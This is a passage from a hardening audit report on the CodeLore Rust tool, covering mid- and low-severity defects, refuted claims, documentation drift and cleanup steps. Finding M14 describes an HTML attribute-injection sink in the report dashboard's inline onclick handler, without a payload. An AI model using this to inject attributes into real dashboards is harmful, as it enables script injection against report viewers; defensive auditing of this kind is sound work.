**M14 — The SPA's only raw `onclick=` is syntactically dead, and is an injection sink.** `js/16_widgets_bars.js:265` builds `onclick="window._codeloreShowDetail && window._codeloreShowDetail(' + JSON.stringify(cr.path) + ')"`. `JSON.stringify` emits `"`-delimited JSON into a `"`-delimited HTML attribute, so the attribute value terminates at the first `"` and the handler compiles to `window._codeloreShowDetail && window._codeloreShowDetail(` — a `SyntaxError`, confirmed under `node`. **Every Coordination-needs row is dead on click, in every report shipped to date.** The same construction means a path containing `"` injects attacker-chosen attributes into a published dashboard. Fix: drop the inline handler and use `addEventListener` with a `data-path` attribute, matching how every other clickable table in the SPA already works.

**M15 — `function-hotspots` is silently truncated under `--group-by`.** `grouping.rs:232-239`, `:257`, `:288` discard the hunks of collapsed paths, while `function_hotspots.rs:97-158` joins against the raw `hunks` table. The result is a quietly incomplete ranking with no notice. `Options::validate()` (`options.rs:464`, `:513`) rejects `group_file` only in combination with `head_only_ingest`, so nothing catches it. Either preserve hunks through grouping, or reject the combination in `validate()` with a clear message.

**M16 — The `diff` ratchet key folds in two option fields where the canonical cache key folds all of them.** `diff.rs:517-530` covers `min_revs` and `exclude`; `cache.rs:46-61` and `:156-158` fold the whole `Options`. Any other option that changes measured values (`group_file`, `window_days`, language filters) silently reuses a baseline computed under different settings. Reuse the canonical hashing helper rather than maintaining a second, narrower list.

**M17 — The bot-filter hygiene guard is a two-literal substring scan, and one surviving filter is invisible to it.** `tests/bot_filter_hygiene_test.rs:64` scans a single directory for two case-sensitive literals — trivially bypassed by whitespace, case, or a different directory. And `analyses/pair_programming.rs:112,130` retains a canonical-level Rust-side bot filter that the guard cannot see, which is exactly the class of bug cycle 4's H3 fixed in SQL. Broaden the guard to the whole crate with a tolerant pattern, and convert `pair_programming` to the `HUMAN_ALIASES_CTE` path.

**M18 — `--complexity-sample adaptive|full` is documented as "parses but warns"; clap exits 2.** `docs/advanced-usage.md:578-579` shows `head (default) | adaptive | full` and "(only `head` is wired up today; the other two parse but warn)". `args.rs:549` sets `value_parser = ["head"]`, so both other values are rejected at parse time. The **code is right** — `cli_test.rs:1063-1075` locks the honest rejection deliberately, and rejecting at the parser is better than accepting-then-erroring. The doc is stale. Fix the two lines; do not touch the code.

**M19 — `RELEASING.md` names four Rust pin sites; there are six.** `docs/RELEASING.md:71` (and `:85`) enumerate `rust-toolchain.toml`, workspace `rust-version`, the `dtolnay/rust-toolchain` action invocations and `CHANGELOG.md`. Unlisted: `clippy.toml:1` (`msrv = "1.96"`), `Containerfile:4` (comment) and `Containerfile:18` (`ARG RUST_VERSION=1.96`). An MSRV bump following the documented procedure leaves clippy linting against the old MSRV and the container building on it. Fix the doc, and better, add a test that greps for the version string across all six and asserts agreement — it is a five-line test that makes the doc unable to rot.

**M20 — `wildcard_import_share` documents Python coverage the extractor cannot deliver.** `architecture_metrics.rs:224-226` describes behaviour for Python wildcard imports; `imports/extractor.rs:527-551` and `:417-460` show the Python path does not produce the rows the metric would need. Either implement it or scope the docstring to the languages actually covered.

**M21 — Load-bearing constants are uncited, module-local and unoverridable.** `hotspot_velocity.rs:35,37` (`RECENT_DAYS = 30`, `BASELINE_DAYS = 90`) and `refactoring_targets.rs:33` (`EA_Z_FLOOR = 25`) each pick a threshold that materially changes output, with no citation and no way for a user to tune it. Every other threshold of this weight in the codebase is either cited to a paper or exposed as a flag. Promote them to `constants.rs` with citations, and expose the two window values via the existing `--window-days` plumbing.

**M22 — `changes.similarity` is written, propagated and never read — and its name collides with a live column.** `facts/schema_v1.sql:57` declares it, ingest populates it, the differential harness carries it, and no analysis consumes it. Meanwhile `clone_members.similarity` (`:148`) is live and means something different, so the two read as related and are not. Drop the dead column (a schema-version bump, which the project already handles cleanly), or wire it to the clone-detection consumer it was presumably meant for.

**M23 — The differential harness has 31 test functions and zero binary, non-ASCII or gitlink probes.** `tests/differential_repo_test.rs` is the gix-vs-git-CLI oracle and it is genuinely good — but all three historical parity bugs in this project were in exactly the classes it does not probe. Add fixtures for a binary blob, a non-ASCII path and filename, a CRLF file, and a submodule gitlink. This is the highest-value test addition in the report.

**M24 — `calibrate-defects` mining ingest is both unguarded and unwitnessable.** `calibrate_defects.rs:56-58` runs an ingest with no witness call, and `:52` sets `include_merges: true`, which means a depth-1 merge tip yields `commit_count() == 1` — so the witness *could not* catch it even if added, because the guard tests for zero. Fix by testing against a meaningful floor for this path (the calibration is statistically meaningless below a few hundred commits anyway), not by adding the standard witness.

**M25 — Error strings leak internal function names, raw DuckDB text and absolute cache paths.** Widespread; the worst instance is `output/sqlite.rs:39`, where the failure mode is "the DuckDB `sqlite` extension needs to be downloaded" and the message says nothing about network access, so an air-gapped user sees an opaque extension-load error with no actionable hint. Add an offline-detection hint there, and sweep the `format!("{e}")` sites that embed absolute cache paths.

**M26 — Exit 4 is a junk drawer, and two flag-validation errors are filed in it.** `CodeLoreError::Analysis` has roughly 370 construction sites against 15 for `Output`; `facts/mod.rs:436`, `:438`, `:441` and `:402` are pure I/O errors wearing the analysis label. More concretely, `analyze.rs:562-568` and `:545-555` return `Analysis` (exit 4) for invalid flag *combinations*, which belong in bucket 2 (CLI/options). Reclassify those two first — they are the ones a user hits by mistyping a command — then split the I/O sites.

**M27 — Coordination-needs rows are the one clickable table with no keyboard path, and no table header has `scope`.** The rows never call `wireRowKbActivation` (`js/00_setup_boot.js:403`), which every other interactive table uses. Separately, `template.html` contains 22 `<th>` elements and **zero** carry a `scope` attribute, so screen readers cannot associate cells with headers anywhere in the report. Both are small, mechanical fixes; the `scope` sweep is a find-and-replace.

**M28 — The crates.io publish sequence is unrecoverable if it fails mid-flight.** `release.yml:332-335` publishes the workspace crates in dependency order under `bash -e`. A failure on crate two of three leaves crate one published (crates.io publications are irreversible), the tag pushed, and the job red — with no idempotent re-run path, because re-running the whole step fails immediately on the already-published crate. This was disclosed as a known residual when cycle-4's H2 landed, so it is a conscious deferral rather than an oversight, but it is still the sharpest edge left in the release pipeline. Fix: make each publish step tolerant of "crate version already exists" (check `crates.io/api/v1/crates/<name>/<version>` first, or match on the specific cargo error) so the step is idempotent and a re-run completes the sequence.

---

## 4. Low and informational

| ID | Finding | Anchor |
|---|---|---|
| L1 | Comments claim "pair-granular" where the join is canonical-level | `authors.rs:107-113`, `top_committers.rs:81-86` |
| L2 | `gix::discover` still not adopted; the change was a text reorder only | `output/banner.rs:156-167` |
| L3 | Legacy unlayered `<style>` block still not `@layer`-wrapped, so it outranks all layered author CSS | `template.html` |
| L4 | A single `sleep 5` makes the "paths-ignore likely matched" branch fire spuriously, burning a duplicate CI matrix | `cut-release.sh:501-504` |
| L5 | No shallow-clone disclosure on `analyze` / `gate` / `explain` / `diff`; `--depth 50` passes the witness silently | — |
| L6 | Sub-threshold emptiness (`DEFAULT_MIN_REVS = 5`) renders as a confident clean artifact; the step summary returns early on empty rows | `step_summary.rs:119-121` |
| L7 | Band-transition docs describe the pre-symmetric rule; only `green→yellow` changed | `advanced-usage.md:167`, `:331` vs `health_trend.rs:202-215` |
| L8 | `.slice(0, 8)` with no dedup or severity ordering lets mild green→yellow moves evict red entries; double emission across three samples | `js/14_widgets_summary.js:222-223` |
| L9 | `all_transitions` is uncapped while the sibling file series caps at 50; docs say transitions are top-hotspot-scoped. Simulated +19–20% row growth | `health_trend.rs:273-372`, `:344` |
| L10 | F251 denominators reach CSV/markdown/JSON but not the step summary or the SPA bars | `step_summary.rs:229-275`, `js/16_widgets_bars.js:169-288` |
| L11 | `write_github_output` still warns-and-continues with a silent else-branch | `main.rs:195-221` |
| L12 | `landed_by_other_pct` tracks the repo's merge-button setting (0.00 on merge commits, 100.00 on squash); only the mailmap confound is disclosed | `delivery_metrics.rs:520-531` |
| L13 | MCP `check_gates` `[new_code]` skip-reason wording changed in both branches while the CHANGELOG says "no output or behavior change" | — |
| L14 | #195's CHANGELOG entry describes two consolidations that did not happen as described | `CHANGELOG.md` |
| L15 | Test cannot distinguish the `FILTER` predicate from counting every row | `delivery_metrics_test.rs:332` |
| L16 | `!d.cognitive` labels any zero-complexity *file* as a directory, contradicting the template | `js/30_coupling_trends.js:640,663` vs `template.html:1652` |
| L17 | `TREEMAP_CAP = 200` is undisclosed while two sibling caps are documented | — |
| L18 | `CodeLoreError::UnknownAnalysisName` has zero producers; the `From` impl is unreachable and the message text exists in triplicate — the only violation of the no-unused-code rule found in the tree, ~20 lines | `analysis.rs:500-518` |
| L19 | `action.yml:17-18` omits `ndjson`, `gha`, `spa` and `step-summary` from the format list (7 listed vs 11 in `args.rs:24`) | — |
| L20 | The lib/cli boundary leaks both ways: the SPA lives in the engine crate, raw SQL lives in the CLI | `calibrate.rs:371`, `calibrate_defects.rs:285,313,328` |
| L21 | The 100k-commit performance row is still TBD | — |
| L22 | Broken-pipe → exit 0 (and panic → 101) are undocumented in the exit-code taxonomy | `advanced-usage.md:1313` |
| L23 | No tool declares `output_schema` / returns `structuredContent`; all eleven hand-roll JSON into a text block, though rmcp's `Json<T>` wrapper exists for exactly this | `mcp.rs` |
| L24 | No CHANGELOG entry for the two-major rmcp bump; `CHANGELOG.md:431` still says "Uses `rmcp 2.2`"; `advanced-usage.md:1591` says `finding_hotspot_overlap` takes no parameters (it takes `limit`); `:1548` says `refactoring_targets` defaults to "all" (it is 50/500); `:1526-1537` and `README.md:446-448` omit `limit`; `deep_analysis_report.md:459` says "8 MCP tools" (11); `mcp.rs:419` says "(default: all)" | — |

| ID | Informational |
|---|---|
| I1 | Bumping `RATCHET_SCHEMA` silently re-baselines a regressed repo and exits 0 (`check.rs:193-240`). Correct by design, but it is a foot-gun worth a one-line notice on the re-baseline path. |
| I2 | `differential_repo_test.rs:202-209` asserts backend parity only — it never asserts the expected canonical value, so both backends could be wrong together. |
| I3 | The new import-share rows never reached user-facing docs. |
| I4 | **F262 (Kaplan-Meier survival analysis) readiness.** Everything needed is already in the store: `commits.date`, `changes.path`, the `change_type` CHECK set, the recursive lineage CTE, the `hotspot_velocity` classifier and `commit_parents`. Right-censoring needs no schema change. What is missing is *state* (no episode table, no survival-curve output shape) and one modelling decision: whether a file deletion is a terminal event or a censoring event. Worth resolving that question before any implementation starts, because it determines the schema. |

---

## 5. The honesty ledger

**What was refuted.** Each finding above survived an adversarial validator whose default verdict was REFUTED. A great deal did not survive, and the refutations are as informative as the findings:

- *"rmcp 3.1.0 does not exist."* This was drafted as a headline finding on the strength of five separate sources each reporting a different "latest rmcp" version — all five wrong. `https://docs.rs/rmcp/3.1.0/` disproved it. Standing methodological note for future cycles: **treat any single-source version or date claim as unverified.**
- *"The rmcp bump changed the negotiated protocol revision."* It did not — see the resolution below.
- *"The MCP error mapping is backwards after the bump."* `impl IntoCallToolResult for ErrorData` returns `Err(self)` in **both** 2.2.0 and 3.1.0, so an `ErrorData` becomes a JSON-RPC protocol error rather than `isError: true` — unchanged, and intentional.
- *Path traversal via MCP `path` parameters.* `require_tracked_path` resolves through `read_blob_at("HEAD", path)`, a git object lookup, not a filesystem open. Not traversable.
- *Unbounded `paths` array.* Capped at `MAX_BRIEFING_PATHS = 20` (`change_context.rs:102`).
- *SQL injection into DuckDB.* Both path-interpolating emitters escape with `replace('\'', "''")`.
- *A CLI-vs-MCP defaults fork.* All eleven MCP `Options` constructions use `..Options::default()`.
- *Warm-blob-reader OOM.* Hard-bounded: gix's object cache is unset by default, leaving only a fixed 64-entry pack delta-base LRU (`gix-0.86.0/src/repository/init.rs:71`), and the pre-change `read_blob_at` already called `to_thread_local()` per call.
- *`ResultMemo` mis-keyed or unbounded.* `MEMO_CAPACITY = 512`, HEAD-scoped, poison-tolerant.
- *RUSTSEC-2026-0189.* Patched in ≥1.4.0; the stdio transport is unaffected regardless.
- *Timezone-dependent date parsing in the SPA, mixed-type `sort()`, `.toFixed()` on `undefined`, division by zero in chart scaling.* All checked; none present. There are zero `new Date(` constructions in the SPA.
- *`?` losing the exit bucket.* `main()` walks `e.chain()`, so it does not.
- *N+1 query patterns; three suspected concurrency idioms; per-analysis registration cost.* All clean.

**The one genuine cross-agent contradiction, and its resolution.** One line of analysis held that the rmcp 2.2→3.1 bump moved the negotiated MCP revision to `2026-07-28`; another held it could not be verified without compiling. Both are reconcilable and the precise answer is: `ProtocolVersion::LATEST == V_2025_11_25` and `impl Default == LATEST` in **both** 2.2.0 and 3.1.0 (verified against `rmcp-2.2.0/src/model.rs:147-208` on disk and against the published 3.1.0 source). rmcp 3.1 *adds* `STANDARD_HEADERS = V_2026_07_28` and a `KNOWN_VERSIONS` list, but **does not move `LATEST`**. So the negotiated revision is unchanged by the bump. Two supporting facts: since rmcp 1.8.0 the server never rejects a client's requested version (`ServerInitializeError::UnsupportedProtocolVersion` is deprecated, `service/server.rs:74-79`), and CodeLore uses stdio, which insulates it from essentially all of the `2026-07-28` transport changes (stateless HTTP, removal of `initialize`/`Mcp-Session-Id`/the standalone GET stream, retirement of HTTP+SSE).

**Residual, stated as residual:** the negotiated-version claim is derived from source reading, not from a live handshake. One command settles it — run `codelore mcp` against a real client and read the `protocolVersion` in the initialize response. That check should be added to `mcp_test.rs` as an exact assertion (M9), which also prevents the question from recurring.

**What could not be verified here, and why.**

1. **The build-time CDN fetch — checked, and it is correct.** This was drafted as a serious open question and it deserves to be recorded as a refutation instead. `crates/codelore-lib/Cargo.toml:131-138` wires a build-time download of the vendored JS deps into `OUT_DIR`, which `output/spa.rs` then `include_str!`s, and jsDelivr/unpkg are proxy-blocked from this host — so the *network* half could not be exercised. But the source settles the design question: `build.rs` imports `sha2::{Digest, Sha256}` (`:64`), gives every asset a hex `sha256` pin (`:95`, `:101`, `:110`, `:125`), verifies the cache on every build (`cached_and_valid`, `:182-190`), and hard-fails the build on mismatch (`:240-252`) with a documented rotation procedure at `:44-45`. The multi-mirror fallback is explicitly safe because the shared SHA validates whichever mirror answers (`:195-199`), and the whole thing sits behind an opt-in `spa` feature so default builds are offline-clean. **The residual is narrow:** whether the upstream URLs still serve those exact bytes today could not be checked, and if a CDN ever stopped serving them the build fails loudly rather than silently, which is the correct failure direction. This is a genuinely good supply-chain design — and it makes H5 worse by comparison, because the project demonstrably knows how to pin and verify a download and does not do it in `action.yml`'s install step.
2. **Nothing compiled.** `rustc 1.95.0` is installed, the workspace pins `1.96.0`, and `static.rust-lang.org` is unreachable. Every claim here is source-anchored, re-implemented, or documentation-anchored. The two quantitative findings (H3, H4) were validated by porting the algorithms to Python and executing them, which is weaker than running the Rust — the ports could differ from the originals. Both ports are described precisely enough above to be re-run against the real code.
3. **One tool anomaly worth recording.** For one docs.rs source page, `WebFetch` quoted the source correctly and then wrote a prose summary asserting the opposite of the quoted code. The verbatim code was trusted over the summary. If a future cycle sees a docs-fetch result whose prose and code disagree, the code is the artifact.

**On the shape of this report.** Ten Highs against cycle 4's five is a large jump, and two of them (H1, H7) are cycle-4 fixes that landed one step short rather than fresh defects. That is not an argument that the fixes were bad — three of five cycle-4 Highs are fully closed with real regression tests, which is a good rate. It is an argument for a specific habit: when a fix adds a *guard*, check what happens on the path where the guard fires twice.

---

## 6. The one fix to make first

**H1.** Not because it is the most elegant defect, but because of its recovery profile: the guard sits **downstream of the cache write**, which converts the original silent-green failure into a *sticky misdiagnosing hard error that survives the exact remedy its own message prescribes*.

Every other finding here degrades something. This one traps a user in a state they cannot reason their way out of: the tool says "fetch more history", they fetch more history, and the tool says the same thing again — with no flag on the affected command to bypass the cache, and a `CLAUDE.md` rule telling them not to delete cache files by hand.

The minimal fix is roughly five lines:

```rust
// crates/codelore-lib/src/facts/mod.rs, immediately before the rename at :440
if db_commit_count == 0 {
    // Never persist a zero-commit store: the cache key is HEAD-scoped, so a
    // later run on a repaired (unshallowed) clone would hit this same file
    // and re-fail the ingest witness on healthy history.
    return Ok(mem_handle);
}
```

Mirroring the dirty-worktree bail already at `:386-394`, which is the same guard for the same reason. Ship it with:

- a `CACHE_EPOCH` bump (`cache.rs:37`, `"schema_v17"` → `"schema_v18"`) so caches already poisoned in the wild are invalidated on upgrade;
- an added clause on the witness message (`facts/mod.rs:590-597`) naming `--cache-dir <scratch>` as the recovery path, since that is the only bypass the gate surfaces currently have;
- a regression test that is the existing `analyze_exits_3_on_truncated_shallow_checkout` **without** `--no-cache`, run twice, asserting the second run over a repaired repository exits 0.

Then H2 (add `--no-cache` to the gate surfaces), which makes the recovery clause redundant in a good way.

---

## 7. Improvement options beyond the defects

**Give the gate product a CI front door (M13).** This is the largest gap between what CodeLore can do and what a user can reach. The quality gates, the ratchet, the delta-health check and the diff gate are the differentiated feature set, and none of them is invocable through the published action. A `command:` input plus a documented gate workflow in `github-action.md` would probably do more for adoption than any analysis added this cycle.

**Adopt MCP structured output (L23).** All eleven tools hand-roll JSON into a text block. rmcp ships `Json<T>`, and the `2025-11-25` revision supports `outputSchema` + `structuredContent`. Declaring schemas turns eleven "here is some text, good luck" tools into eleven typed tools an agent can plan against. Combined with the annotations in M7, this is the difference between a server an agent can use and one it must guess at.

**Make the docs unable to rot.** Three of this report's findings (H9, M18, M19) are documentation that contradicts shipped code, and the ledger rot in H10 is the same disease at the process level. The project already has the right pattern for this — `analyze.rs:2310` and `:2318-2333` enforce that every analysis is reachable from every surface, via exhaustive matches with no `_ =>` arm, and it works: the registration surface has stayed correct across five cycles while free-text docs have drifted every cycle. Extend that instinct: a test that greps the six Rust pin sites and asserts agreement (M19); a test that asserts the SARIF divisor named in the docs matches the constant in `sarif.rs` (H9); a test that asserts the documented `--complexity-sample` values match the `value_parser` list (M18). Each is under ten lines and each permanently closes a class of finding that has now appeared in multiple cycles.

**Extend the differential harness into the classes that actually broke (M23).** Thirty-one tests, zero binary / non-ASCII / gitlink / CRLF probes, and all three historical parity bugs were in those classes. The harness is the project's best safety property; it is currently pointed slightly away from the target.

**Consider `overflow-checks = true` in release.** There is none anywhere in the workspace. The statistics layer — Fisher exact, BH-FDR, Wilson intervals, propagation cost, Tarjan SCC, Leiden, Kamei JIT-SDP, type-7 quantiles — does enough integer arithmetic on repo-scale inputs to make silent wraparound a real (if unobserved) risk, and the cost on an analysis workload is small.

**Resolve the F262 modelling question before implementing (I4).** Whether a deleted file is a terminal event or a right-censoring observation determines the episode schema. Decide it first; the data layer is otherwise ready.

**Deferred, and still open from prior cycles:** re-running the competitor pass in a single sitting, and the `.devt` scripts → Rust migration question. That second one is a genuine architectural decision rather than a defect, and it deserves a proper answer rather than a paragraph appended to a hardening report.

---

## 8. Docs to update with these fixes

| Doc | Line | Says | Should say |
|---|---|---|---|
| `docs/advanced-usage.md` | 549 | `security-severity = (100 − cognitive_health) / 4` | `/ 10` **(H9)** |
| `docs/github-action.md` | 35 | `(100 − code_health) / 4` | `(100 − cognitive_health) / 10` **(H9)** |
| `docs/advanced-usage.md` | 578-579 | `adaptive`/`full` "parse but warn" | Only `head` is accepted; the others are rejected at the parser **(M18)** |
| `docs/RELEASING.md` | 71, 85 | Four Rust pin sites | Six: add `clippy.toml:1`, `Containerfile:4`, `Containerfile:18` **(M19)** |
| `docs/advanced-usage.md` | 1074-1082 | Warning fires "whenever" a cache hit lands on a dirty tree | Interactive stderr only **(M3)** |
| `docs/advanced-usage.md` | 1657 | "All tools are read-only" | `delta_health` creates a temporary worktree **(M6)** |
| `docs/advanced-usage.md` | 1313, 854 | Exit 4 = "Analysis error"; `diff` divergence unexplained | Document `diff`'s code, plus broken-pipe → 0 and panic → 101 **(M12, L22)** |
| `docs/advanced-usage.md` | 1591 | `finding_hotspot_overlap` "Parameters: none" | Takes `limit` **(L24)** |
| `docs/advanced-usage.md` | 1548 | `refactoring_targets` limit "Default: all" | 50, capped at 500 **(L24)** |
| `docs/advanced-usage.md` | 1526-1537 | `limit` omitted | Document it **(L24)** |
| `README.md` | 446-448 | `limit` omitted | Document it **(L24)** |
| `docs/advanced-usage.md` | 145 | "8 tables" | 10, per `output/sqlite.rs:25-34` |
| `action.yml` | 17-18 | 7 formats | 11, per `args.rs:24` **(L19)** |
| `CHANGELOG.md` | 431 | "Uses `rmcp 2.2`" | 3.1, plus an `[Unreleased]` entry for the bump **(L24)** |
| `docs/roadmap-v1.x-and-beyond.md` | 54 | "15 metrics", "10 ancillary subcommands" | 46 topics per `explain.rs:23`; 12 subcommands |
| `deep_analysis_report.md` | 459 | "8 MCP tools" | 11 |
| `CLAUDE.md` | 18, 41 | 43 analyses | Reconcile — five docs currently say 43, 54 or 57 |
| `deep_analysis_report.md` | 287/398, 459, 473, 474 | F231 both `Active` and `Fixed`; F249/F263/F264 stale `Active` | Reconcile **(H10)** |
| `2026-08-02-discovery-pass-f249-f267.md` | 4, 338 | "Nothing here is implemented"; F269/F268 conflict | Eight items are now implemented **(H10)** |
| `architecture_metrics.rs` | 224-226 | Python wildcard-import coverage | Scope to supported languages **(M20)** |
| `quality_gates/config.rs` | 218-224 | `[new_code].window_days` shares one working set | It does not **(M11)** |
| `mcp.rs` | 70-74, 419 | "every list tool caps its output"; "(default: all)" | True once M5 lands; fix the default **(M5, L24)** |
| `docs/github-action.md` | all 187 lines | Never mentions `check`/`gate`/`diff` | Document the gate workflow **(M13)** |

---

## 9. Method and limits

Seven parallel audit passes over `git archive deea354`, each producing findings independently, each running its own adversarial validation with a default verdict of REFUTED, followed by a reconciliation pass that de-duplicated overlaps and resolved the one genuine cross-pass contradiction (§5). Dimensions: cycle-4 fix verification; the ingest-witness entry-point matrix; the rmcp migration and full MCP surface; new features in the delta; the F-item ledger and docs drift; a cross-cutting sweep of architecture, error taxonomy, exit codes, SPA and accessibility; and a best-practices research pass against current MCP, SARIF, GitHub Actions and Rust guidance.

Before writing, the ten High findings and the load-bearing Mediums were re-verified a second time directly against the extracted tree, independently of the pass that produced them. Findings whose anchors did not survive that re-check are not in this report.

De-duplications applied: the TTY-gated staleness warning was found twice at different severities and is filed once at Medium (M3), since the cache-*write* guard is unconditional and the defect is disclosure-only. The `panic = "abort"` question was raised three times from three angles and is filed once at High, scoped to the MCP surface, with the honest narrowing that first-party code is clean (H6). The "skipped verdict has no teeth" finding was raised repo-wide and again as a `diff`-specific residue; filed once (H7). Ledger rot was raised in two passes and filed once (H10).

Limits, restated plainly: nothing was compiled; the two quantitative findings (H3, H4) rest on Python ports rather than on the Rust; the vendored-JS CDN URLs could not be dereferenced, though the pinning and verification logic around them was read and is correct; and the negotiated MCP protocol version is established from source reading rather than from a live handshake. Each is a one-command check on a host with network access and a matching toolchain, and each is named at the point it matters rather than buried here.

---

## 10. Housekeeping

- **`docs/hardening-cycle-4` at `e554d74` must not be merged as-is — delete it.** It is unpushed, unmerged, and *based on `35f6bab`*, which is now 25 commits behind `main`. `git diff main docs/hardening-cycle-4` is −4493 lines: merging that branch would revert the entire v0.25.0 + v0.25.1 delta, including every cycle-4 fix it was written to document. The one thing on it worth keeping is the report file itself, which never reached `main`, so **`docs/reports/2026-07-29-hardening-cycle-4.md` has been carried onto this cycle's branch** (same blob, `git rev-parse docs/hardening-cycle-4:docs/reports/2026-07-29-hardening-cycle-4.md`, so it is byte-identical, not a re-render). Once this branch lands, `docs/hardening-cycle-4` can be deleted with nothing lost.
- **`docs/hardening-cycle-3` is already gone** — its content merged via PR #184 and the local branch has since been pruned. No action.
- **The previous `_to_delete/` (~54 MB) is gone** — cleared between cycles. Thank you; nothing carried over.
- **Three audit artifacts from this cycle** (`cl251.tar` 8.8 MB, `delta5.diff`, `delta5.log`) were staged into the repo root and have been moved to `_to_delete/cycle5-audit-artifacts/`, ~9.6 MB total. The device bridge cannot unlink, so they need one `rm -rf _to_delete` from you. They are untracked and not in the commit.
- **Fifteen stray `.git/objects/*/tmp_obj_*` files** remain, up from ~5 at cycle 4 — each report commit through the bridge leaves a few more, because `unlink` on the temp file is refused after the object is written. They are harmless (git ignores unreferenced `tmp_obj_*`) and `git gc` will not clear them; `find .git/objects -name 'tmp_obj_*' -delete` clears all fifteen.
- **This report** is committed to branch `docs/hardening-cycle-5`, based on `deea354`, per repo convention. It is not merged to `main`.
